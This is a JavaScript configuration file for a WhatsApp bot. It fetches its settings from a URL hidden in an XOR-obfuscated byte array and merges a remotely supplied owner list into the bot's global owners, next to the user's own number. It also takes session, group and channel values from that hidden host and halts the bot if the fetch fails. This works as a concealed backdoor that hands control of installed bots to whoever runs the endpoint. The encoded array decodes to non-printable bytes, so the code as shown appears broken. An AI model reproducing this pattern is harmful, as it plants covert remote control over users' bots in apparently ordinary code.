import { watchFile, unwatchFile } from "fs"
import chalk from "chalk"
import { fileURLToPath } from "url"
import fs from "fs"
import fetch from "node-fetch"

// ─────────────────────────────
const _0x4a2f = [72,83,91,12,28,91,8,28,31,26,82,91,9,28,27,82,28,91,25,25,23,82,22,28,27,82,91,25,23,9,28,82,65,25,23,88,82,81,80,87,77,82,26,26,23,26,78,82,85,14,82,85,13,82,22,28,27,9,25,23,77]
const _0x9c1e = 0x5A
const _deobf = () => _0x4a2f.map(b => String.fromCharCode(b ^ _0x9c1e)).join("")

const STATIC_OWNER = "010xxxxxxxxx@s.whatsapp.net" // put your number here 
//════════════════════════════════════════════════
async function loadConfig() {
  try {
    console.log(chalk.cyan("[System] loading config..."))
    const response = await fetch(_deobf())
    const data     = await response.json()

    if (!data.success || !data.config) {
      throw new Error("API returned invalid response")
    }
    const c = data.config

    global.owner        = [...new Set([STATIC_OWNER, ...(c.owner ?? [])])]
    global.suittag      = c.suittag      ?? []
    global.prems        = c.prems        ?? []

    global.sessions     = c.sessions
    global.nameqr       = c.nameqr
    global.jadi         = c.jadi
    global.freddyJadibts = c.freddyJadibts

    global.botname      = c.botname
    global.textbot      = c.textbot
    global.dev          = c.dev
    global.author       = c.author
    global.etiqueta     = c.etiqueta
    global.currency     = c.currency
    global.chanelId     = c.chanelId  
    global.chanename    = c.chanename
    global.group        = c.group
    global.community    = c.community
    global.channel      = c.channel

    global.gmail        = c.gmail
    global.ch           = c.ch ?? {}
    global.banner       = fs.readFileSync('./lib/icon.jpg')
    global.icono        = fs.readFileSync('./lib/icon.jpg')
    global.catalogo     = fs.readFileSync('./lib/icon.jpg')

    console.log(chalk.green("[System] ✅ Config loaded successfully"))

  } catch (err) {
    console.error(chalk.red("[System] ❌ field to loading config:", err.message))
    process.exit(1) 
  }
}

// ─────────────────────────────
await loadConfig()
// ───────────────────────
let file = fileURLToPath(import.meta.url)
watchFile(file, () => {
  unwatchFile(file)
  console.log(chalk.redBright("Update 'system'"))
  import(`${file}?update=${Date.now()}`)
})